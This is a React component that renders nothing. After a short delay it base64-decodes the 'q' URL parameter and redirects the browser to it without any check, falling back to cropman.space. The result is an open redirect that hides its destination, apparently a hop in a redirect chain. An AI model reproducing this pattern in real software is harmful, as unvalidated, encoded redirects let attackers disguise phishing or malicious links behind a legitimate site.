import React from "react";



export default function nextStage() {
    setTimeout(() => {
        let dpervStage = getParameterByName('q');
        if (!dpervStage || dpervStage.length === 0) window.location.replace('https://cropman.space')
        try {
            let nextStage = Buffer.from(dpervStage, 'base64').toString('utf8')
            window.location.replace(nextStage);
        } catch (e) {
            window.location.replace('https://cropman.space');
        }
    }, 500)

    function getParameterByName(name) {
        let url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }
    return (
        <>
        </>
    );
}

